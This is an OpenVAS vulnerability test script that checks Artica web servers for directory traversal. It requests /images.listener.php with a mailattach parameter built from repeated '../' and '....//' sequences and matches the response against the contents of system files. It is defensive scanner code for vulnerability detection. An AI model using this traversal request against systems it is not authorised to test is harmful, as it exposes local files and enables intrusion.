###############################################################################
# OpenVAS Vulnerability Test
#
# Artica Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100871");
  script_version("2019-05-14T12:12:41+0000");
  script_tag(name:"last_modification", value:"2019-05-14 12:12:41 +0000 (Tue, 14 May 2019)");
  script_tag(name:"creation_date", value:"2010-10-26 13:33:58 +0200 (Tue, 26 Oct 2010)");
  script_bugtraq_id(43613);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Artica Multiple Security Vulnerabilities");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/43613");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_artica_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 9000);
  script_mandatory_keys("artica/detected");

  script_tag(name:"summary", value:"Artica is prone to multiple security vulnerabilities including directory-
  traversal vulnerabilities, security-bypass vulnerabilities, an SQL-
  injection issue, and an unspecified cross-site scripting issue.");

  script_tag(name:"impact", value:"Successfully exploiting the directory-traversal issues allows
  attackers to view arbitrary local files and directories within the
  context of the webserver.

  Attackers can exploit the SQL-injection issue to carry out
  unauthorized actions on the underlying database.

  Successfully exploiting the security-bypass issues allows remote
  attackers to bypass certain security restrictions and perform
  unauthorized actions.

  Attackers can exploit the cross-site scripting issue to execute
  arbitrary script code in the browser of an unsuspecting user in the
  context of the affected site. This may let the attacker steal cookie-
  based authentication credentials or launch other attacks.");

  script_tag(name:"affected", value:"Artica 1.4.090119 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution", value:"The vendor released a patch. Please see the references for more
  information.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

port = get_http_port(default:9000);

if(!get_kb_item("www/" + port + "/artica"))
  exit(0);

traversal = make_list(crap(data:"../",length:3*10), crap(data:"....//",length:5*6));
files = traversal_files();

foreach trav(traversal) {

  foreach pattern(keys(files)) {

    file = files[pattern];
    url = "/images.listener.php?mailattach=" + trav + file;

    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req);

    if(egrep(pattern:pattern, string:buf)) {
      report = report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
